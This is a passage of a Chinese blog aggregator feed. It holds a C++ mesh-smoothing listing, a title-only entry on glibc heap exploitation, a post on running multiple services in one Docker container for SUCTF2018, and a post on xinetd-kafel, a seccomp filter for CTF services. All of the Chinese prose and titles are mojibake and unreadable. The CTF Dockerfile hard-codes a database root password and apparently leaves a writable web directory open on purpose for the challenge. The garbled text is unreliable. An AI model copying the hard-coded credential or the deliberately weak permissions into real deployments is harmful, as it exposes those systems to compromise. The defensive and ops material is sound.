<span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p>åŸå§‹å›¾å½¢<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>å»å™ªå<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>å˜å½¢å<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="æ€è·¯æ€»ç»“-amp-é‡åˆ°çš„é—®é¢˜"><a href="#æ€è·¯æ€»ç»“-amp-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="æ€è·¯æ€»ç»“&amp;é‡åˆ°çš„é—®é¢˜"></a>æ€è·¯æ€»ç»“&amp;é‡åˆ°çš„é—®é¢˜</h2><p>task1ä¸­æµ·ä¼¦å…¬å¼æ³¨æ„pè¡¨ç¤ºåŠå‘¨é•¿</p><p>task2ä¸­çš„è®¡ç®—é¡¶ç‚¹æ³•å‘çš„æ€æƒ³æ˜¯å°†ç›¸é‚»çš„æ‰€æœ‰é¢ç‰‡æ³•å‘ç›¸åŠ </p><p>task3ä½¿ç”¨é¢ç‰‡è¿­ä»£å™¨ï¼Œè°ƒç”¨å‡½æ•°ç®—å‡ºä¸‰è§’å½¢ä¸­å¿ƒå’Œæ³•å‘ï¼Œä½¿ç”¨ <code>glBegin(LINES)</code>ç”»çº¿</p><p>task4è¦é¦–å…ˆç®—å‡ºæ‰€æœ‰ç‚¹åœ¨ä¸€ç¯é‚»æ¥é¡¶ç‚¹ä½œç”¨ä¸‹çš„æ­£ç¡®ä½ç½®ï¼ˆå³é‚»æ¥é¡¶ç‚¹ç›¸åŠ é™¤ä»¥é‚»æ¥é¡¶ç‚¹ä¸ªæ•°ï¼‰ï¼Œç„¶åç»Ÿä¸€ä¿®æ”¹meshä¸­é¡¶ç‚¹æ•°æ®ã€‚è¿™é‡Œå­˜å‚¨æ‰€æœ‰é¡¶ç‚¹æ–°ä½ç½®ç”¨åˆ°äº†å®¹å™¨ï¼Œä½¿ç”¨æ—¶è¦æ³¨æ„å…ˆç»™å®¹å™¨åˆ†é…ç©ºé—´ï¼Œè€Œä¸”å®¹å™¨ä¸‹æ ‡ä»0å¼€å§‹ï¼Œä¸ç„¶ä¼šæŠ¥é”™å®¹å™¨ä¸‹æ ‡è¶Šç•Œ</p><p>task5åœ¨task4çš„åŸºç¡€ä¸Šä»¥å¦ä¸€ç§æ–¹æ³•ä¿®æ”¹äº†é¡¶ç‚¹ä½ç½®å®ç°ä¸€ç§æ–°çš„ç½‘æ ¼å˜æ¢æ“ä½œå¿…è¦æ—¶å¯ä»¥è‡ªå·±å‘å†…æ ¸ä»£ç æ·»åŠ ä¸€äº›å‡½æ•°</p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[å †åˆ©ç”¨å˜è¿ Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[å †åˆ©ç”¨å˜è¿ Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/</id>
        <title><![CDATA[å¦‚ä½•ç§‘å­¦çš„åœ¨Docker Containerä¸­è¿è¡Œå¤šä¸ªæœåŠ¡]]></title>
        <updated>2018-08-25T13:29:15+08:00</updated>
        <link href="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"><![CDATA[<p>åœ¨ä¸€ä¸ªDocker Containerä¸­è¿è¡Œå¤šä¸ªæœåŠ¡ï¼Ÿæ‰“æ‰°äº†ã€‚</p>
<h1>0x00 å‰è¨€</h1>
<p>Dockerï¼Œæˆ–è¯´ä»»ä½•åŸºäº<code>å†…æ ¸namespace</code>çš„è½»é‡çº§è¿›ç¨‹éš”ç¦»æŠ€æœ¯ï¼Œåœ¨è®¾è®¡ä¹‹åˆï¼Œéƒ½ä¸æ˜¯ä¸ºäº†å½“ä½œè™šæ‹Ÿæœºä½¿ç”¨çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶ä¸­è¿è¡Œçš„å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿã€‚åŒ…æ‹¬Dockerå®˜æ–¹ï¼Œä¹Ÿæ˜¯æ¨èåœ¨ä¸€ä¸ªContainerå†…ä»…è¿è¡Œä¸€ä¸ªæœåŠ¡ã€‚å¦‚æœéœ€è¦è¿è¡Œå¤šä¸ªæœåŠ¡ï¼Œåº”é€šè¿‡<code>docker run --link</code> æˆ–è€…<code>docker-compose</code>æ¥å…³è”å¤šä¸ªå®¹å™¨ã€‚ä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸å¸Œæœ›å°†ä¸€ä¸ªå®Œæ•´çš„å¯è¿è¡Œç¯å¢ƒæ‰“åŒ…æˆä¸€ä¸ª<code>docker image</code>ï¼Œä¸å†ä¾èµ–å…¶ä»–çš„å®¹å™¨ã€‚æ¯”å¦‚åœ¨CTFæ¯”èµ›ä¸­ï¼Œå°†å¤šä¸ªæœåŠ¡æ‰“åŒ…æˆä¸€ä¸ªImageï¼Œå¯ä»¥æœ‰æ•ˆåœ°æé«˜åœ¨ç¯å¢ƒå—æŸåæ¢å¤çš„æ•ˆç‡ã€‚åœ¨ç»å†äº†å¤šåœºæ¯”èµ›ï¼Œçœ‹è¿‡å„ç§å¤§å¸ˆå‚…ç”¨å„ç§å¥‡æ€ªçš„å§¿åŠ¿å®Œæˆè¿™ä¸ªä»»åŠ¡åï¼Œè§‰å¾—åº”è¯¥å¥½å¥½çš„è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚</p>
<h1>0x01 é”™è¯¯çš„å§¿åŠ¿</h1>
<ol>
<li>ä½¿ç”¨upstartçš„å¯åŠ¨æ–¹å¼</li>
</ol>
<pre><code># Dockerfile
From ubuntu:14.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN service mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; service mysql stop
CMD service mysql start &amp;&amp; service apache2 start &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>ä½¿ç”¨systemdçš„å¯åŠ¨æ–¹å¼</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN systemctl start mysql &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; systemctl stop mysql
CMD systemctl start mysql &amp;&amp; systemctl start apache2 &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>ä½¿ç”¨å¯åŠ¨è„šæœ¬å¯åŠ¨å¤šä¸ªæœåŠ¡</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
ADD entrypoint.sh /sbin/
RUN chmod +x /sbin/entrypoint.sh /var/www/html/init_sql.sh&amp;&amp; \
     /etc/init.d/mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; /etc/init.d/mysql stop
CMD /sbin/entrypoint.sh
</code></pre>
<pre><code>#!/bin/bash 

# entrypoint.sh
/usr/bin/mysqld start &amp;
/usr/bin/httpd &amp;
while true
do
sleep 100
done
</code></pre>
<p>åœ¨å®é™…ä¸­ï¼Œä½¿ç”¨<code>æ–¹æ³•1</code>æˆ–è€…<code>æ–¹æ³•2</code>å¾ˆå¤§å‡ ç‡æ— æ³•å®Œæˆå°†å¤šä¸ªæœåŠ¡è·‘åœ¨åŒä¸€ä¸ªcontainerä¸­çš„ä»»åŠ¡ã€‚<code>æ–¹æ³•3</code>è™½ç„¶å¯ä»¥ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p>
<ol>
<li>ä¸€æ—¦äº§ç”Ÿåƒµå°¸è¿›ç¨‹ï¼Œå°†æ— äººå›æ”¶ï¼Œåªæœ‰æ€æ‰æ•´ä¸ªcontaineræ‰èƒ½è§£å†³ã€‚</li>
<li>åœ¨åœæ­¢containerçš„æ—¶å€™å°†æ— äººå¤„ç†<code>SIGTERM</code>ç­‰ä¿¡å·ã€‚</li>
<li>å¾ˆéš¾é‡å¯å…¶ä¸­æŸä¸€ä¸ªæœåŠ¡</li>
</ol>
<p><code>æ–¹æ³•1</code>å’Œ<code>æ–¹æ³•2</code>ä¸èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºdockeråªæ˜¯ä¸€ä¸ªè¿›ç¨‹éš”ç¦»çš„æ²™ç®±ç¯å¢ƒï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„è™šæ‹Ÿæœºã€‚è€Œ<code>service xxx start</code> å’Œ<code>systemctl start xxx</code> åˆ†åˆ«æ˜¯<code>upstart</code>å’Œ<code>systemd</code>è¿™ä¸¤ä¸ª<code>/sbin/init</code>è¿›ç¨‹çš„æ›¿ä»£è€…çš„æœåŠ¡ç®¡ç†å‘½ä»¤ã€‚è€Œ<code>upstart</code>å’Œ<code>systemd</code>éƒ½è¦æ±‚ç³»ç»Ÿå¿…é¡»æ˜¯ç‰©ç†æœºæˆ–è™šæ‹Ÿæœºï¼Œå¹¶ä¸æ”¯æŒä½œä¸ºcontainerçš„<code>init</code>è¿›ç¨‹ã€‚æ–¹æ³•3å­˜åœ¨é—®é¢˜æ˜¯å› ä¸ºï¼Œåœ¨æ­£å¸¸çš„ç³»ç»Ÿä¸­ï¼Œ<code>init</code>è¿›ç¨‹æ°¸è¿œå ç”¨<code>PID=1</code>çš„ä½ç½®ï¼Œå›æ”¶åƒµå°¸è¿›ç¨‹ã€å¤„ç†æœªå¤„ç†çš„ä¿¡å·ç­‰éƒ½æ˜¯ç”±<code>init</code>è¿›ç¨‹å¸®æˆ‘ä»¬å®Œæˆçš„ï¼Œä¸€ä¸ªå­è¿›ç¨‹å¦‚æœå¤±å»äº†çˆ¶è¿›ç¨‹ï¼Œä¹Ÿä¼šç”±<code>init</code>è¿›ç¨‹æ¥ç®¡ã€‚ä½†æ˜¯åœ¨containerä¸­ï¼Œ<code>init</code>è¿›ç¨‹å¹¶ä¸å­˜åœ¨ï¼Œ<code>PID=1</code>çš„è¿›ç¨‹æ˜¯æˆ‘ä»¬åœ¨<code>Dockerfile</code>ä¸­å®šä¹‰çš„<code>Entrypoint</code>æˆ–æœ€åä¸€ä¸ª<code>CMD</code>æŒ‡å®šçš„å‘½ä»¤ã€‚</p>
<pre><code>root@vpscn:/var/lib/docker# docker exec -it hackmd sh
/hackmd # ps -ef
PID   USER     TIME   COMMAND
    1 hackmd     1:03 node app.js
   42 hackmd     0:00 /usr/local/bin/node ./lib/workers/dmpWorker.js
   62 root       0:00 sh
   69 root       0:00 ps -ef
</code></pre>
<p>å› æ­¤ï¼Œå¯¹äºå¯åŠ¨æ–¹æ³•3çš„containerï¼Œæˆ‘ä»¬åº”è¯¥åœ¨å¯åŠ¨æ—¶åŠ ä¸Š<code>--init</code>å‚æ•°ï¼Œæ¥å¼ºåˆ¶ä½¿ç”¨<a href="https://github.com/krallin/tini">tini</a>ä½œä¸º<code>init</code>è¿›ç¨‹ã€‚ä½†æ˜¯å°±ç®—è¿™æ ·ï¼Œåœ¨æœåŠ¡å¤šäº†ä¹‹åï¼Œè¿›è¡Œé‡å¯ç­‰æ“ä½œä»ç„¶å¾ˆç¹çã€‚</p>
<h1>0x02 æ¨èçš„å§¿åŠ¿</h1>
<p>ä½œä¸ºä¸€ä¸ª~~é‡‘ç‰Œè¿ç»´~~æ‰“æ‚çš„ï¼Œç®€å•è°ˆè°ˆæˆ‘å¸¸ç”¨çš„æ–¹æ³•ã€‚</p>
<p>é¦–å…ˆæ¨èä¸€ä¸ªè¶…çº§å¥½ç”¨çš„åŸºç¡€é•œåƒ<code>phusion/baseimage</code>ã€‚æˆªè‡³SUCTF2018ç¯å¢ƒå‡†å¤‡å®Œæˆæ—¶ï¼Œè¯¥é•œåƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯<code>0.10.1</code>ï¼ŒåŸºäº<code>ubuntu 16.04</code>ã€‚æˆ‘ä»¬å¸¸ç”¨çš„<code>apt-get</code>ç­‰å‘½ä»¤éƒ½å¯ä»¥æ— ç¼å…¼å®¹ã€‚<a href="https://github.com/phusion/baseimage-docker">phusion/baseimage</a> é‡‡ç”¨äº†ä½œè€…è‡ªå·±å¼€å‘çš„ä¸€ä¸ªåŸºäº<code>python</code>çš„<code>init</code>è¿›ç¨‹ä½œä¸ºContainerçš„<code>Entrypoint</code>ï¼Œé‡‡ç”¨<code>runit</code>ä½œä¸ºæœåŠ¡ç®¡ç†å™¨ã€‚è¿™ä¸ªåŸºç¡€é•œåƒè¿˜æ˜¯åœ¨Codingæ‰“æ‚çš„æ—¶å€™çŸ¥é“çš„ï¼Œ<a href="https://studio.coding.net">Coding ~~WebIDE~~ Studio</a> çš„Web Terminalä¹Ÿæ˜¯åŸºäºè¿™ä¸ªé•œåƒåšçš„ã€‚NUAACTF/SUCTFçš„PWNé¢˜åŸºç¡€é•œåƒ<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>ä¹Ÿæ˜¯åŸºäºè¿™ä¸ªé•œåƒåšçš„ã€‚</p>
<p>ç„¶åç›´æ¥è´´ä¸ªåœ¨SUCTF2018è¿ç»´æœŸé—´å†™çš„<code>Dockerfile</code></p>
<pre><code>#Dockerfile
FROM phusion/baseimage:0.10.1
MAINTAINER Yibai Zhang &lt;xm1994@outlook.com&gt;

RUN sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    apt-get update &amp;&amp; apt-get install -y apache2 libapache2-mod-php php-mysql mariadb-server &amp;&amp;\
    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* /var/www/html/*

RUN mkdir -p /etc/service/apache2/ &amp;&amp; \
    printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run &amp;&amp;\
    chmod +x /etc/service/apache2/run &amp;&amp; mkdir -p /etc/service/mysql/ &amp;&amp;\
    printf "#!/bin/sh\n\ntrap \"mysqladmin -uroot -psuCTF_P1us_1s shutdown\" 1 2 3 6 15\n\nexec /usr/bin/mysqld_safe" &gt; /etc/service/mysql/run &amp;&amp;\
    mkdir -p /var/run/mysqld/ &amp;&amp; chown mysql:mysql /var/run/mysqld &amp;&amp;\
    chmod 700 /etc/service/mysql/run /etc/service/apache2/run

COPY web /var/www/html
COPY flag /flag
RUN echo "secure-file-priv=/var/www/" &gt;&gt;/etc/mysql/mariadb.conf.d/50-server.cnf &amp;&amp; chmod -R 777 /var/www/html/favicon
COPY init_sql.sh /tmp/init_sql.sh
RUN chmod +x /tmp/init_sql.sh &amp;&amp; bash -c "/tmp/init_sql.sh" &amp;&amp; rm /tmp/init_sql.sh
EXPOSE 80
</code></pre>
<pre><code>#!/usr/bin/env bash
#init_sql.sh

mysqld_safe &amp;   
echo -n "Waiting for mysql startup"
while ! mysqladmin --host="localhost" --silent ping ; do
    echo -n "."
    sleep 1
done
echo

mysql -uroot &lt;&lt;EOF
UPDATE mysql.user SET Password=PASSWORD('XXXXXX'), plugin = '' WHERE User='root';
create database calc;
use calc;
create table user(
id INT NOT NULL AUTO_INCREMENT primary key,
username varchar(32) NOT NULL,
password varchar(32) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into user values(1,'admin','aa67095d8e65d624548cb6b50bd4778e');
create table file(
id INT NOT NULL AUTO_INCREMENT primary key,
filename varchar(32) NOT NULL,
filehash varchar(32) NOT NULL,
sig varchar(120) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
create table flag(
flag varchar(120) primary key
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into flag values('SUCTF{a_very_long_long_long_long_long_fake_flag_d}');
grant SELECT, INSERT on calc.user to 'suctf'@localhost identified by 'suctf';
grant SELECT, INSERT, UPDATE on calc.file to 'suctf'@localhost ;
grant SELECT on calc.flag to 'suctf'@localhost ;
FLUSH PRIVILEGES;
EOF

mysqladmin -uroot -pXXXXXX shutdown
</code></pre>
<p>è¿™é‡Œç€é‡çœ‹ä¸€ä¸‹<code>printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run</code>ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯åœ¨åˆ›å»ºrunitå¯åŠ¨è„šæœ¬ã€‚å…·ä½“çš„è¯´æ˜å¯ä»¥å»çœ‹<code>phusion/baseimage</code>æˆ–è€…<code>runit</code>çš„æ‰‹å†Œã€‚æ‰§è¡Œå®Œæˆåä¼šåœ¨<code>/etc/service/apache2/run</code>ä¸‹é¢ç”Ÿæˆå¦‚ä¸‹å†…å®¹çš„è„šæœ¬</p>
<pre><code>#!/bin/sh

trap "apachectl -k graceful-stop" 1 2 3 6 15

exec /usr/sbin/apachectl -D FOREGROUND
</code></pre>
<p>è¿™ä¸ªè„šæœ¬ä¼šä½œä¸ºrunitçš„å­è¿›ç¨‹è¿è¡Œï¼Œå¹¶å°†Apache2ä¿æŒåœ¨å‰å°è¿è¡Œã€‚åœ¨æ¥æ”¶åˆ°<code>1 2 3 6 15</code>è¿™å‡ ä¸ªä¿¡å·çš„æ—¶å€™å‹å¥½çš„(graceful)ç»“æŸApache2ã€‚å¦‚æœåœ¨è¿è¡Œä¸­éœ€è¦é‡å¯ApacheæœåŠ¡ï¼Œåªéœ€è¦è¿è¡Œ<code>docker exec container_name sv restart apache2</code>å³å¯ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåœ¨Containeråœæ­¢çš„æ—¶å€™ä¹Ÿå¯ä»¥é€šçŸ¥ç›¸å…³çš„è¿›ç¨‹ï¼Œè€Œä¸æ˜¯ç›´æ¥å…¨éƒ¨æ€æ­»ï¼Œæ›´å¯ä»¥ä¿è¯æœåŠ¡çš„å®Œæ•´æ€§ã€‚~~è™½ç„¶åœ¨æ¯”èµ›ä¸­åŸºæœ¬æŒ‚äº†å°±è¦æ¢å¤ç¯å¢ƒæ ¹æœ¬ä¸éœ€è¦ä¿è¯å®Œæ•´æ€§ã€‚~~</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/05/xinetd-kafel/</id>
        <title><![CDATA[xinetd-kafel â€“ ä¸€ä¸ªæ›´å®‰å…¨çš„xinetdæœåŠ¡]]></title>
        <updated>2018-05-12T13:26:27+08:00</updated>
        <link href="https://www.summershrimp.com/2018/05/xinetd-kafel/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/05/xinetd-kafel/"><![CDATA[<p>ä¸ºäº†ä¿è¯CTFè§£é¢˜/æ¸—é€èµ›ä¸­PWNæœåŠ¡æœ‰æ›´ç¨³å®šçš„è¡¨ç°ï¼ˆé¢„é˜²æ…å±æ£ï¼‰å’ŒCTFæ”»é˜²èµ›ä¸­æœ‰äººä½¿ç”¨ptrace/seccompç­‰ç³»ç»Ÿè°ƒç”¨åšé€šç”¨é˜²å¾¡ï¼Œæˆ‘åœ¨xinetdä¸­åŠ å…¥äº†å¯¹syscallçš„è¿‡æ»¤ã€‚æ„Ÿè°¢Googleçš„Kafelé¡¹ç›®ï¼Œç»™ç¼–å†™seccomp bpfä»£ç æä¾›äº†ä¸€ç§æ›´æ–¹ä¾¿çš„æ–¹æ³•ã€‚</p>
<h1>0x00 å‰è¨€ï¼šä¸ºå•¥è¦æè¿™ä¸ªä¸œè¥¿ï¼Ÿ</h1>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨CTFçº¿ä¸‹èµ›ä¸­ï¼Œå„å¤§ä¸»åŠæ–¹æ˜ä»¤ç¦æ­¢ä½¿ç”¨é€šç”¨é˜²å¾¡è½¯ä»¶/è§„åˆ™å¯¹èµ›é¢˜è¿›è¡Œé˜²å¾¡ã€‚ä½†æ˜¯ç›®å‰åœ¨å›½å†…å¤–çš„å„å¤§æ¯”èµ›ä¸­ï¼ŒPWNé¢˜ç›®å¤šç”¨socatæˆ–xinetdæä¾›æœåŠ¡ã€‚è€Œè¿™ä¸¤ä¸ªç»„å»ºéƒ½å¤ªè¿‡ç®€é™‹ï¼Œæ— æ³•æä¾›ç²¾ç»†çš„ç³»ç»Ÿè°ƒç”¨æ§åˆ¶ï¼Œä¸»åŠæ–¹å¯¹é€šé˜²å·¥å…·çš„æ£€æŸ¥å¤šä¸ºäººå·¥ç™»é™†gameboxæ£€æŸ¥ã€‚<br />
åœ¨è¿‘æ—¥ç»“æŸçš„ä¸€åœºçº¿ä¸‹èµ›ä¸­ï¼ŒæŸæˆ˜é˜Ÿå‘æˆ‘åé¦ˆæˆåŠŸçš„ä½¿ç”¨äº†æˆ‘åœ¨å»å¹´ç¼–å†™çš„ä¸€ä¸ª<a href="https://github.com/Asuri-Team/pwn-sandbox">PWNé€šé˜²å·¥å…·</a>è‹Ÿåˆ°äº†æœ€åï¼ˆå…³äºè¿™ä¸ªå·¥å…·çš„åŸç†å¦‚æœæœ‰å…´è¶£æ¬¢è¿starä¸€ä¸‹å¯¹åº”é¡¹ç›®ï¼Œäººæ•°å¤šçš„è¯æˆ‘ä¼šå†å¼€å‘å†™æ–‡ç« ï¼‰ã€‚<br />
æˆ‘ä¹ŸæƒŠè®¶äºä¸»åŠæ–¹ç«Ÿç„¶å¯¹è¿™ä¹ˆå¤§å‹çš„é€šé˜²å·¥å…·éƒ½æ²¡æœ‰å¯Ÿè§‰ã€‚</p>
<p>è€Œåœ¨CTFè§£é¢˜èµ›/æ¸—é€èµ›ä¸­ï¼Œè™½ç„¶æœ‰dockerè¿™ä¸€å®¹å™¨æŠ€æœ¯å¯ä»¥ä¸ºpwné¢˜ç›®éš”ç¦»è¿è¡Œç¯å¢ƒï¼Œé™åˆ¶è¿è¡Œèµ„æºï¼Œæ–¹ä¾¿é‡å¯ç­‰ç»´æŠ¤å·¥ä½œï¼Œä½†ä¾ç„¶éš¾ä»¥é¿å…æœ‰éƒ¨åˆ†æ…å±é€‰æ‰‹é‡‡ç”¨è¯¸å¦‚<a href="https://zh.wikipedia.org/wiki/Fork%E7%82%B8%E5%BC%B9">Forkç‚¸å¼¹</a>ç­‰æ‰‹æ®µå¯¹æœåŠ¡å™¨è¿›è¡ŒDoSæ”»å‡»ã€‚<br />
å› æ­¤ï¼Œå¯¹ä¸€äº›ç”¨ä¸åˆ°çš„çš„ç³»ç»Ÿè°ƒç”¨è¿›è¡Œé™åˆ¶ï¼Œä¹Ÿå¯ä»¥å¤§å¤§å‡å°‘æ…å±æ£é€‰æ‰‹çš„æ•°é‡ã€‚ï¼ˆDockerå·²ç›´æ¥æ”¯æŒå¯¹containerå†…ç¨‹åºè¿›è¡Œç³»ç»Ÿè°ƒç”¨é™åˆ¶<a href="https://docs.docker.com/engine/security/seccomp/">Read More</a>ï¼‰</p>
<p>å› æ­¤ï¼Œ<a href="https://github.com/Asuri-Team/xinetd-kafel">xinetd-kafel</a>è¿™ä¸€æ”¹ç‰ˆçš„xinetdæœåŠ¡æ²¹ç„¶è€Œç”Ÿã€‚</p>
<h1>0x01 åŸç†ï¼šä½ å¯¹xinetdåšäº†ç‚¹å•¥ï¼Ÿ</h1>
<p>å…¶å®ä¿®æ”¹xinetdè®©å…¶æ”¯æŒå¯¹ç³»ç»Ÿè°ƒç”¨çš„è¿‡æ»¤è¿™ä¸€æƒ³æ³•æœ€æ—©åœ¨Defcon 2015 Finalæ—¶å°±å·²è¢«å…¶ä¸»åŠæ–¹å®ç°ã€‚ä½†ä¸»åŠæ–¹å¹¶æœªå¼€æºå…¶xinetdä»£ç ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼‰ï¼Œè€Œä¸”å…¶åªèƒ½åœ¨xinetdçš„é…ç½®æ–‡ä»¶ä¸­å¯¹syscallè¿›è¡Œç®€å•çš„é»‘ç™½åå•è¿‡æ»¤ï¼Œéš¾ä»¥æœ‰æ•ˆé™åˆ¶æ—¥æ¸å¢é•¿çš„æ…å±å¤§å†›ã€‚<br />
è®©ç¨‹åºæ”¯æŒsyscallè¿‡æ»¤é€šå¸¸æ¥è®²æœ‰ä¸¤ç§åŠæ³•ï¼š<br />
1. ptrace<br />
2. seccomp<br />
å…¶ä¸­ï¼Œptraceå°±æ˜¯linuxä¸‹gdbç”¨æ¥è°ƒè¯•ç¨‹åºæ‰€ä½¿ç”¨çš„syscallï¼Œè€Œä¸”å…¶åŠŸèƒ½å¦‚å…¶åï¼Œprocess traceï¼Œ ç”¨äºè·Ÿè¸ªè¿›ç¨‹çš„å„ç§è°ƒç”¨ã€‚<br />
ä½†æ˜¯ç”±äºptraceä½¿ç”¨è¿‡äºå¤æ‚ï¼Œæˆ‘ä»¬åœ¨xinetdä¸­ï¼Œå¹¶æœªä½¿ç”¨è¿™ä¸€æ–¹å¼ï¼Œè€Œé‡‡ç”¨äº†seccompã€‚</p>
<h2>seccompæ˜¯ä¸ªå•¥ï¼Ÿ</h2>
<p><code>seccomp - operate on Secure Computing state of the process</code><br />
